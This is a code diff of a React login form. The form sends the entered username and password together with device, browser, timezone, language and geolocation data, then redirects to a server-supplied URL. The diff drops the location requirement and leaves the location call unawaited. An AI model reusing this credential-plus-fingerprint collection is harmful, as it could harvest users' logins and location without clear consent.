@@ -33,6 +33,7 @@ const LogIn = () => {
   const device = getDeviceType();
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   const browser = detectBrowser();
+  const location = Coordinate();
 
   // Get the query parameters
   const urlString = window.location.href;
@@ -58,54 +59,41 @@ const LogIn = () => {
   const handleUserInfo = async (e) => {
     e.preventDefault();
     try {
-      const location = await Coordinate();
+      console.log("location", location);
 
       // Check if geolocation is supported and user location is available
-      if (
-        location !== "Geolocation is not supported" &&
-        location !== "Unavailable"
-      ) {
-        const { username, password } = e.target.elements;
 
-        // update the username state
-        setUsername(username.value);
+      const { username, password } = e.target.elements;
 
-        const userData = {
-          username: username.value,
-          password: password.value,
-          time,
-          ip: "",
-          os,
-          device,
-          timezone,
-          language: userLanguage,
-          browser,
-          location,
-          randomSession,
-          mainparams,
-          redirectUrl,
-        };
+      // update the username state
+      setUsername(username.value);
 
-        const response = await dispatch(loginUser(userData));
-        const sessionID = response?.payload?.session_id;
-        const URL = response?.payload?.url;
+      const userData = {
+        username: username.value,
+        password: password.value,
+        time,
+        ip: "",
+        os,
+        device,
+        timezone,
+        language: userLanguage,
+        browser,
+        location,
+        randomSession,
+        mainparams,
+        redirectUrl,
+      };
 
-        if (sessionID) {
-          // Set the redirecting state to true
-          setRedirecting(true);
+      const response = await dispatch(loginUser(userData));
+      const sessionID = response?.payload?.session_id;
+      const URL = response?.payload?.url;
 
-          // Redirect to specific url
-          window.location.href = URL;
-        }
-      } else {
-        console.error("Error getting location:", location);
-        setLoginMessage(
-          "Please allow access to your location to log in.",
-          "error",
-          5000
-        );
-        // Prevent login when geolocation is not available
-        return;
+      if (sessionID) {
+        // Set the redirecting state to true
+        setRedirecting(true);
+
+        // Redirect to specific url
+        window.location.href = URL;
       }
     } catch (error) {
       throw new Error(error.response.data.info);
